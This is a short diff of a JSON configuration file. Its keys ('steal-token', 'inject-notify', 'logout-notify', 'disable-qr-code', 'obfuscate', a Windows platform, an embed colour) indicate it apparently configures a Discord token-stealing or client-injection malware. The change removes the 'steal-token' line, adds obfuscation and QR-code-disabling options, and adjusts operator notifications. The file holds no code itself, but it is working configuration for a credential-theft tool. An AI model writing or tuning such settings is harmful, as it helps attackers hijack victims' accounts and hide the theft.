@@ -1,9 +1,10 @@
 {
     "platform": ["windows"],
+    "obfuscate": false,
     "logout": "instant",
-    "steal-token": "false",
     "inject-notify": "true",
     "logout-notify": "true",
-    "init-notify":"true",
+    "init-notify":"false",
+    "disable-qr-code":"true",
     "embed-color": "3447704"
 }
